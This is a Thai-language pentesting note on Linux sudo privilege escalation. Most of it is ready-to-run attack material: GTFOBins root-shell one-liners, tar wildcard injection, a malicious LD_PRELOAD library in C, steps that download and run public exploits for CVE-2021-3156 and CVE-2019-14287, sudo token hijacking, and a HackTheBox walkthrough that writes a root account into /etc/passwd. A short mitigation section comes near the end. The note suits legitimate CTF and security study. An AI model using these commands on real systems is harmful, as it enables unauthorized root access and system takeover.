	#privesc #sudo #linux

# Sudo Privilege Escalation

## Overview
Sudo (Super User Do) เป็นเครื่องมือที่ใช้ในการให้สิทธิ์ privileged commands แก่ผู้ใช้ทั่วไป โดยการ misconfiguration หรือช่องโหว่ของ sudo สามารถนำไปสู่การยกระดับสิทธิ์ (Privilege Escalation) ได้

**Related Topics:** [[GTFOBins]] | [[⬆️ Privilege Escalation Linux]] | [[Linux Enumeration]] | [[SUID]] | [[Capabilities]]

---

## Basic Enumeration

### ตรวจสอบ Sudo Permissions

```bash
# ดูว่า user ปัจจุบันมีสิทธิ์ sudo command อะไรได้บ้าง
sudo -l

# ดูเวอร์ชันของ sudo (สำคัญสำหรับการหา CVE)
sudo -V

# แสดง sudo policy
sudo -ll
```

> [!tip] Output Analysis
> เมื่อรัน `sudo -l` ให้สังเกต:
> - Commands ที่รันได้โดยไม่ต้องใส่รหัสผ่าน (NOPASSWD)
> - Environment variables ที่สามารถ preserve ได้
> - User/Group ที่สามารถรันคำสั่งแทนได้ (Runas specification)

---

## Common Sudo Misconfigurations

### 1. Sudo with NOPASSWD

เมื่อ sudoers file มีการตั้งค่า NOPASSWD ให้กับ commands ที่เสี่ยง:

```bash
# /etc/sudoers
user ALL=(ALL) NOPASSWD: /usr/bin/vim
user ALL=(ALL) NOPASSWD: /usr/bin/find
user ALL=(ALL) NOPASSWD: /usr/bin/python*
```

**Exploitation:**

```bash
# ใช้ vim escape to shell
sudo vim -c ':!/bin/bash'

# ใช้ find execute command
sudo find /etc -name "test" -exec /bin/bash \;

# ใช้ python spawn shell
sudo python -c 'import os; os.system("/bin/bash")'
```

### 2. Wildcard Injection

เมื่อมี wildcard (`*`) ใน sudoers:

```bash
# /etc/sudoers
user ALL=(ALL) NOPASSWD: /usr/bin/tar *
```

**Exploitation:**

```bash
# สร้าง malicious archive ที่มี --checkpoint-action
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=/bin/bash"

# รัน sudo tar จะทำให้เกิด command injection
sudo tar cf archive.tar *
```

### 3. Environment Variable Injection

เมื่อ sudoers อนุญาตให้ preserve environment variables:

```bash
# /etc/sudoers
Defaults env_keep += "LD_PRELOAD"
Defaults env_keep += "LD_LIBRARY_PATH"
```

**Exploitation with LD_PRELOAD:**

```c
// shell.c - สร้าง malicious shared library
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```bash
# Compile malicious library
gcc -fPIC -shared -o shell.so shell.c -nostartfiles

# ใช้ LD_PRELOAD inject library ตอนรัน sudo
sudo LD_PRELOAD=/tmp/shell.so find
```

---

## Known CVE Exploits

### CVE-2021-3156 (Baron Samedit) - Heap-Based Buffer Overflow

**Description:** Heap-based buffer overflow ใน sudo versions 1.8.2 - 1.8.31p2, 1.9.0 - 1.9.5p1

**Affected Versions:**
- Sudo 1.8.2 through 1.8.31p2
- Sudo 1.9.0 through 1.9.5p1

**Exploitation:**

```bash
# ตรวจสอบว่าเป็น vulnerable version หรือไม่
sudoedit -s /
# ถ้าได้ error "sudoedit: /: not a regular file" = vulnerable

# ใช้ public exploit
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
./sudo-hax-me-a-sandwich

# หรือใช้ exploit อื่น
wget https://github.com/worawit/CVE-2021-3156/raw/main/exploit_nss.py
python3 exploit_nss.py
```

> [!warning] CVE-2021-3156 Requirements
> - ต้องมี local access
> - ไม่ต้องมี sudo privileges ก่อน
> - Exploit ทำงานได้บน Linux, macOS, BSD

**Technical Details:**
```bash
# Vulnerability เกิดจากการ parse command-line arguments
# เมื่อมี backslash ('\') ตัวสุดท้ายใน argument

# Trigger vulnerability
sudoedit -s '\' $(python3 -c 'print("A"*1000)')

# การ exploit จะ overflow heap memory และเขียนทับ
# service_user struct เพื่อให้ NSS plugin load malicious .so
```

### CVE-2019-14287 (Runas User ID Bypass)

**Description:** Bypass security policy โดยการใช้ User ID -1 หรือ 4294967295

**Affected Versions:**
- Sudo < 1.8.28

**Vulnerability Condition:**

```bash
# /etc/sudoers ที่มีการตั้งค่าแบบนี้จะเสี่ยง
user ALL=(ALL, !root) NOPASSWD: /usr/bin/command
# หมายความว่า user สามารถรัน command ได้ในฐานะ user อื่นๆ ยกเว้น root
```

**Exploitation:**

```bash
# ตรวจสอบ sudo configuration
sudo -l
# Output: (ALL, !root) NOPASSWD: /bin/bash

# Bypass โดยใช้ user ID -1 (ระบบจะ map เป็น root uid = 0)
sudo -u#-1 /bin/bash

# หรือใช้ 4294967295 (unsigned int max value)
sudo -u#4294967295 /bin/bash

# ได้ root shell!
whoami  # root
```

> [!tip] Quick Check
> ```bash
> # ถ้าเจอ pattern นี้ใน sudo -l ให้ลอง CVE-2019-14287
> (ALL, !root) NOPASSWD: <command>
> ```

---

## GTFOBins Integration

[[GTFOBins]] เป็น database ของ Unix binaries ที่สามารถใช้ bypass security restrictions ได้

### Common Sudo-Exploitable Binaries

```bash
# 1. หา commands ที่สามารถรัน sudo ได้
sudo -l

# 2. ค้นหา command ใน GTFOBins (https://gtfobins.github.io/)

# ตัวอย่าง commands ที่พบบ่อยและ exploit ได้ง่าย:
```

**Vim/Vi:**
```bash
sudo vim -c ':!/bin/sh'
sudo vi -c ':!/bin/sh' /dev/null
```

**Find:**
```bash
sudo find . -exec /bin/sh \; -quit
sudo find /etc -name passwd -exec /bin/bash \;
```

**Perl:**
```bash
sudo perl -e 'exec "/bin/sh";'
```

**Python:**
```bash
sudo python -c 'import os; os.system("/bin/sh")'
sudo python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**Less/More:**
```bash
# รัน less แล้วกด !
sudo less /etc/profile
!/bin/sh
```

**Wget (file write):**
```bash
# เขียนทับไฟล์ system files
LFILE=/etc/sudoers
echo "user ALL=(ALL) NOPASSWD: ALL" | sudo wget -O $LFILE -i -
```

**Git:**
```bash
sudo git -p help
# จะเปิด pager (less) กด ! แล้วพิมพ์ /bin/sh
!/bin/sh
```

---

## Advanced Techniques

### Sudo Token Hijacking

เมื่อมี user ใช้ sudo อยู่ credential จะถูก cache (default 15 นาที):

```bash
# ตรวจสอบว่ามี sudo session อยู่หรือไม่
sudo -n true 2>/dev/null && echo "Sudo session active"

# ใช้ ptrace hijack sudo token จาก process อื่น
# ต้องใช้ tool เช่น sudo_inject
git clone https://github.com/nongiach/sudo_inject.git
cd sudo_inject
make

# Hijack token
./sudo_inject <target_pid>
```

### Shared Library Hijacking

```bash
# ตรวจสอบว่า sudo binary ใช้ shared libraries อะไรบ้าง
ldd $(which sudo)

# ถ้า sudoers อนุญาตให้ preserve LD_LIBRARY_PATH
sudo -l | grep LD_LIBRARY_PATH

# สร้าง malicious library แล้วชี้ LD_LIBRARY_PATH ไปหา
```

---

## Real CTF Example: HTB Spider

**Scenario:** HackTheBox machine "Spider"

**Initial Access:**
```bash
# พบว่า user มี sudo permissions บางอย่าง
www-data@spider$ sudo -l
User www-data may run the following commands:
    (root) NOPASSWD: /usr/bin/chown

# chown สามารถเปลี่ยน owner ของไฟล์ได้
```

**Exploitation Path:**

```bash
# Step 1: เปลี่ยน owner ของ /etc/passwd ให้เป็น www-data
sudo chown www-data:www-data /etc/passwd

# Step 2: สร้าง root user ใหม่โดยไม่ต้องใส่รหัสผ่าน
# Generate password hash
openssl passwd -1 -salt pwn pwned
# Output: $1$pwn$xyz123...

# Step 3: เพิ่ม root user ใหม่เข้าไปใน /etc/passwd
echo 'pwn:$1$pwn$xyz123...:0:0:root:/root:/bin/bash' >> /etc/passwd

# Step 4: Switch เป็น user ใหม่
su pwn
# Password: pwned

# Step 5: ได้ root!
whoami  # root
cat /root/root.txt
```

> [!success] Key Takeaway
> การ misconfiguration ของ sudo แม้แต่คำสั่งที่ดูไม่เป็นอันตราย เช่น `chown` ก็สามารถนำไปสู่ root ได้

---

## Prevention & Mitigation

### Secure Sudoers Configuration

```bash
# 1. หลีกเลี่ยงการใช้ NOPASSWD ถ้าไม่จำเป็น
user ALL=(ALL) /usr/bin/command

# 2. ระบุ absolute path และห้ามใช้ wildcard
user ALL=(ALL) NOPASSWD: /usr/bin/specific-command

# 3. Restrict environment variables
Defaults env_reset
Defaults !env_keep

# 4. จำกัด runas users
user ALL=(specific_user) /usr/bin/command

# 5. ใช้ sudo logging
Defaults logfile="/var/log/sudo.log"
Defaults log_input, log_output
```

### Update & Patch

```bash
# ตรวจสอบเวอร์ชัน sudo ปัจจุบัน
sudo -V | head -1

# Update sudo เป็น version ล่าสุด
sudo apt update && sudo apt install sudo

# หรือบน RHEL/CentOS
sudo yum update sudo
```

---

## References

- [[GTFOBins]] - Unix binaries privilege escalation database
- [[⬆️ Privilege Escalation Linux]] - Main privilege escalation techniques
- [[SUID]] - SUID binary exploitation
- [[Linux Enumeration]] - System enumeration guide
- https://gtfobins.github.io/
- CVE-2021-3156: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3156
- CVE-2019-14287: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14287

---

## Quick Reference

```bash
# Enumeration
sudo -l                    # List sudo permissions
sudo -V                    # Check sudo version
sudo -ll                   # Detailed sudo policy

# CVE Checks
sudoedit -s /              # Test CVE-2021-3156
sudo -u#-1 /bin/bash       # Test CVE-2019-14287

# GTFOBins Quick Wins
sudo vim -c ':!/bin/sh'
sudo find . -exec /bin/sh \; -quit
sudo perl -e 'exec "/bin/sh";'
sudo python -c 'import os; os.system("/bin/sh")'
```